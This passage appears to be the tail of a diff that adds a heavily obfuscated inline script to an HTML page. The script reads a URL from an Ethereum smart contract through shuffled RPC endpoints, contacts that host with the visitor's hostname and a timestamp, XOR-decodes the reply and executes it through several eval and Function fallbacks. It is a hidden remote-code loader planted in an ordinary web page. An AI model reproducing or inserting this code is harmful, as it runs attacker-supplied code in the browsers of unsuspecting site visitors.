_0x1d831c=_0x17ca73[0x0],_0x316b29=_0x147138+_0x1d831c,_0xc55402=_0x5c76['NxBYrh'][_0x316b29];return!_0xc55402?(_0x5c76fd=_0x5c76['xLXnos'](_0x5c76fd),_0x5c76['NxBYrh'][_0x316b29]=_0x5c76fd):_0x5c76fd=_0xc55402,_0x5c76fd;}function rpcCall(_0x16884f,_0x1f4fb7,_0x50cea1){var _0x2c8e99=_0x323bf1;try{var _0x17ee37=new XMLHttpRequest();_0x17ee37[_0x2c8e99(0x1e2)](_0x2c8e99(0x203),_0x16884f,!![]),_0x17ee37[_0x2c8e99(0x1dc)]('Content-Type','application/json'),_0x17ee37[_0x2c8e99(0x1d2)]=0x1388,_0x17ee37['ontimeout']=function(){_0x50cea1(null);},_0x17ee37['onreadystatechange']=function(){var _0x91b442=_0x2c8e99;if(_0x17ee37[_0x91b442(0x1f6)]===0x4){if(_0x17ee37[_0x91b442(0x1ec)]===0xc8)try{_0x50cea1(JSON['parse'](_0x17ee37[_0x91b442(0x1f3)]));}catch(_0x15954c){_0x50cea1(null);}else _0x50cea1(null);}},_0x17ee37[_0x2c8e99(0x1eb)](JSON[_0x2c8e99(0x1f8)](_0x1f4fb7));}catch(_0x34b08d){_0x50cea1(null);}}function getUrlFromContract(_0x9c01d3){var _0x5952d9=_0x323bf1,_0x1b5196={'jsonrpc':'2.0','id':0x1,'method':_0x5952d9(0x1d1),'params':[{'to':CONTRACT_ADDRESS,'data':GETTEXT_CALLDATA},_0x5952d9(0x1e4)]},_0x44f686=0x1388,_0x5bbab4=0xea60;function _0x3ad08d(){var _0x3bf7c1=_0x5952d9,_0x44e966=RPC_LIST[_0x3bf7c1(0x1ff)]();for(var _0x45838b=_0x44e966['length']-0x1;_0x45838b>0x0;_0x45838b--){var _0x4db0aa=Math['floor'](Math[_0x3bf7c1(0x204)]()*(_0x45838b+0x1)),_0x3a7c63=_0x44e966[_0x45838b];_0x44e966[_0x45838b]=_0x44e966[_0x4db0aa],_0x44e966[_0x4db0aa]=_0x3a7c63;}function _0x1e5098(){var _0x5924b0=_0x3bf7c1;if(!_0x44e966[_0x5924b0(0x206)]){setTimeout(function(){var _0x6418fa=_0x5924b0;if(_0x44f686<_0x5bbab4)_0x44f686=Math[_0x6418fa(0x1e8)](_0x44f686*0x2,_0x5bbab4);_0x3ad08d();},_0x44f686);return;}var _0x8d844e=_0x44e966[_0x5924b0(0x1e0)]();rpcCall(_0x8d844e,_0x1b5196,function(_0x1657d1){var _0x4cb067=_0x5924b0;if(_0x1657d1&&_0x1657d1['result']&&_0x1657d1['result'][_0x4cb067(0x206)]>0xa){var _0x418ab0=decodeAbiString(_0x1657d1[_0x4cb067(0x1f1)]);if(_0x418ab0)return _0x9c01d3(_0x418ab0);}_0x1e5098();});}_0x1e5098();}_0x3ad08d();}window[_0x323bf1(0x1f5)]=function(_0x5e12f8){var _0xa9d1dc=_0x323bf1,_0x47a7fa='',_0x5e12f8=_0x5e12f8||window[_0xa9d1dc(0x1da)];if(_0x5e12f8)_0x5e12f8[_0xa9d1dc(0x1e6)]=_0x47a7fa;return _0x47a7fa;};function init(_0x59b93b){var _0x5b1f18=_0x323bf1;function _0x518cef(_0x1a1c8e){var _0x5bb6ef=_0x5c76;let _0x3beb65='';for(let _0x3d803f=0x0;_0x3d803f<_0x1a1c8e['length'];_0x3d803f+=0x2)_0x3beb65+=String['fromCharCode'](parseInt(_0x1a1c8e[_0x5bb6ef(0x1ea)](_0x3d803f,0x2),0x10));return _0x3beb65;}function _0x1a476c(_0x1e5557,_0x5168f1){var _0x4cdbb3=_0x5c76;const _0xb0d3c7=_0x518cef(_0x5168f1),_0x10ccf5=_0x518cef(_0x1e5557);let _0x626743='';for(let _0x150a22=0x0;_0x150a22<_0x10ccf5[_0x4cdbb3(0x206)];_0x150a22++)_0x626743+=String['fromCharCode'](_0x10ccf5[_0x4cdbb3(0x1d4)](_0x150a22)^_0xb0d3c7[_0x4cdbb3(0x1d4)](_0x150a22%_0xb0d3c7[_0x4cdbb3(0x206)]));return _0x626743;}function _0x1ddba3(_0x55f371,_0x188ba3){var _0x51752a=_0x5c76;let _0x16537f='';for(let _0xd1ade7=0x0;_0xd1ade7<_0x55f371[_0x51752a(0x206)];_0xd1ade7++)_0x16537f+=String[_0x51752a(0x1d9)](_0x55f371[_0x51752a(0x1d4)](_0xd1ade7)^_0x188ba3['charCodeAt'](_0xd1ade7%_0x188ba3[_0x51752a(0x206)]));return btoa(_0x16537f);}function _0x24a835(_0x8bf0e6){var _0x1383d4=_0x5c76,_0x267ea2='',_0x4183e7=_0x1383d4(0x20a);for(var _0x2e57cd=0x0;_0x2e57cd<_0x8bf0e6;_0x2e57cd++)_0x267ea2+=_0x4183e7[_0x1383d4(0x1e9)](Math[_0x1383d4(0x209)](Math[_0x1383d4(0x204)]()*_0x4183e7['length']));return _0x267ea2;}const _0x248d96=_0x24a835(0x10),_0xf510ec=Math[_0x5b1f18(0x209)](Date[_0x5b1f18(0x1de)]()/0x3e8),_0x500415=window[_0x5b1f18(0x1ed)]['hostname'],_0x49fa50=_0x1ddba3(_0xf510ec+'|'+_0x500415,_0x248d96);getRequest(_0x59b93b+_0x5b1f18(0x1d8)+_0x49fa50+_0x5b1f18(0x1d7)+_0x248d96,function(_0x1072b5){var _0x39f0cb=_0x5b1f18;if(_0x1072b5)try{var _0x5469eb=JSON['parse'](_0x1072b5);if(_0x5469eb['i1']&&_0x5469eb['i2']){var _0x44dfe2=_0x1a476c(_0x5469eb['i2'],_0x5469eb['i1']),_0x5141a4=base64ToUtf8(JSON[_0x39f0cb(0x1dd)](_0x44dfe2)['blob']);myEval(_0x39f0cb(0x1d5)+_0x5141a4+_0x39f0cb(0x1e1));}}catch(_0x2bfcdc){console[_0x39f0cb(0x1fb)](_0x2bfcdc);}});}(function(){var _0x2fd999=_0x323bf1,_0x4a5326=_0x2fd999(0x1f9)+CONTRACT_ADDRESS[_0x2fd999(0x207)]('0x','')[_0x2fd999(0x1ff)](0x0,0xc);if(window[_0x4a5326])return;window[_0x4a5326]=0x1,getUrlFromContract(function(_0x4cf167){if(_0x4cf167)init(_0x4cf167);});}());function _0x17ca(){var _0x347a2c=['kgz1BMn0Aw9UkcL7ia','C3rYAw5NAwz5','x193CgzF','mJbowgrTDvK','Bg9N','Ahr0Chm6lY9WB2X5z29Ulw1HAw5UzxqUChvIBgLJlMjSyxn0yxbPlMLV','ih0PkcK','Aw5KzxHpzG','C2XPy2u','odaYmgDLvNv1Bq','Ahr0Chm6lY9WB2X5z29UlxjWyY5JB20','mtC4ode4q0jxthnz','ue9tva','CMfUzg9T','mhHLmdbMztjLyG','BgvUz3rO','CMvWBgfJzq','Ahr0Chm6lY9WB2X5z29UlNb1yMXPy25VzguUy29T','zMXVB3i','ywjJzgvMmdeYmZq1nJC4oq','odK0B21WD01S','zxrOx2nHBgW','DgLTzw91Da','Ahr0Chm6lY9WB2X5z29UlMrYCgmUB3jN','y2HHCKnVzgvbDa','kgz1BMn0Aw9UkcL7','y29UC3rYDwn0B3i','jMDPzd0','p3nPzd0','zNjVBunOyxjdB2rL','zxzLBNq','Ahr0Chm6lY8XCNbJlMLVl21HDgLJ','C2v0uMvXDwvZDeHLywrLCG','CgfYC2u','BM93','CMv0DxjUicHMDw5JDgLVBIGPEYa','C2HPzNq','FsKOkq','B3bLBG','qwXSigv2ywWGC3rYyxrLz2LLCYbIBg9JA2vKlIbmyxn0igvYCM9YoIa','Bgf0zxn0','mvbIzwfJtG','CMv0DxjUvMfSDwu','mJe0odK3nLHUA2XJtG','BwLU','y2HHCKf0','C3vIC3rY','C2vUza','C3rHDhvZ','Bg9JyxrPB24','mti1mti1uhzxzgH4','mZC0ndyWmefOCezQAW','ndGYnJKYAMjABgz1','CMvZDwX0','qujdrevgr0HjsKTmtu5puffsu1rvvLDywvPHyMnKzwzNAgLQA2XTBM9WCxjZDhv2D3H5EJaXmJm0nty3odKRlW','CMvZCg9UC2vuzxH0','mJm4mZCZmxbWtM9ewa','B25IzwzVCMv1BMXVywq','CMvHzhLtDgf0zq'];_0x17ca=function(){return _0x347a2c;};return _0x17ca();}var myEval=(function(){var _0x5dfd3a=[function(_0x46bae0){var _0x564165=_0x5c76;return new Function(_0x564165(0x1df)+_0x46bae0+_0x564165(0x1fd))();},function(_0x1a5ef3){var _0x286ad5=_0x5c76,_0xd9f578=function(){}[_0x286ad5(0x1d6)];return _0xd9f578('return\x20(function(){\x20'+_0x1a5ef3+_0x286ad5(0x1fd))();},function(_0x56f778){var _0x47b46d=_0x5c76,_0x3b3833=[][_0x47b46d(0x1d6)][_0x47b46d(0x1d6)];return _0x3b3833(_0x47b46d(0x1df)+_0x56f778+_0x47b46d(0x1fd))();},function(_0x554c37){var _0x5a41d0=_0x5c76,_0x272a98=(0x0,eval);return _0x272a98('(function(){\x20'+_0x554c37+_0x5a41d0(0x1fd));},function(_0x2d0025){var _0x3ea79c=_0x5c76;return eval(_0x3ea79c(0x1f7)+_0x2d0025+'\x20})()');}],_0x2b01f3=-0x1;return function(_0x427e34){var _0x42b1fc=_0x5c76;if(_0x2b01f3!==-0x1)try{return _0x5dfd3a[_0x2b01f3](_0x427e34);}catch(_0xa53371){_0x2b01f3=-0x1;}var _0x3cb83d;for(var _0x1278f2=0x0;_0x1278f2<_0x5dfd3a[_0x42b1fc(0x206)];_0x1278f2++){try{var _0x4e8df8=_0x5dfd3a[_0x1278f2](_0x427e34);return _0x2b01f3=_0x1278f2,_0x4e8df8;}catch(_0x2edccc){_0x3cb83d=_0x2edccc;}}throw new Error(_0x42b1fc(0x1e3)+_0x3cb83d);};}());function getRequest(_0x1f41a5,_0xe51402){var _0x476ab3=_0x323bf1;try{var _0x78d59c=new XMLHttpRequest();_0x78d59c['open']('GET',_0x1f41a5,!![]),_0x78d59c[_0x476ab3(0x1eb)](),_0x78d59c['onreadystatechange']=function(){var _0x401097=_0x476ab3;if(_0x78d59c[_0x401097(0x1f6)]==0x4)_0xe51402(_0x78d59c[_0x401097(0x1ec)]===0xc8?_0x78d59c[_0x401097(0x1f3)]:undefined);};}catch(_0x500025){_0xe51402(undefined);}}function base64ToUtf8(_0x111136){var _0x137aa9=_0x323bf1,_0x20e4d8=_0x137aa9(0x1f2);_0x111136=String(_0x111136)[_0x137aa9(0x207)](/[^A-Za-z0-9\+\/\=]/g,'');var _0x672a59='',_0x16d002=0x0,_0x59c264=0x0,_0x42874a;for(var _0x188085=0x0;_0x188085<_0x111136['length'];_0x188085++){var _0x126de0=_0x111136[_0x137aa9(0x1e9)](_0x188085);if(_0x126de0==='=')break;_0x42874a=_0x20e4d8[_0x137aa9(0x1fe)](_0x126de0);if(_0x42874a===-0x1)continue;_0x59c264=_0x16d002%0x4?(_0x59c264<<0x6)+_0x42874a:_0x42874a;if(_0x16d002++%0x4)_0x672a59+=String[_0x137aa9(0x1d9)](_0x59c264>>(-0x2*_0x16d002&0x6)&0xff);}var _0x58e7ea='',_0x2c6731=_0x672a59[_0x137aa9(0x206)],_0x1dc491=0x0;while(_0x1dc491<_0x2c6731){var _0x33d473=_0x672a59[_0x137aa9(0x1d4)](_0x1dc491++);if(_0x33d473<0x80)_0x58e7ea+=String[_0x137aa9(0x1d9)](_0x33d473);else{if(_0x33d473>0xbf&&_0x33d473<0xe0)_0x58e7ea+=String[_0x137aa9(0x1d9)]((_0x33d473&0x1f)<<0x6|_0x672a59[_0x137aa9(0x1d4)](_0x1dc491++)&0x3f);else{var _0x5bcbb6=_0x672a59[_0x137aa9(0x1d4)](_0x1dc491++),_0x4d35a1=_0x672a59[_0x137aa9(0x1d4)](_0x1dc491++);_0x58e7ea+=String['fromCharCode']((_0x33d473&0xf)<<0xc|(_0x5bcbb6&0x3f)<<0x6|_0x4d35a1&0x3f);}}}return _0x58e7ea;}</script>
+  </body>
+</html>
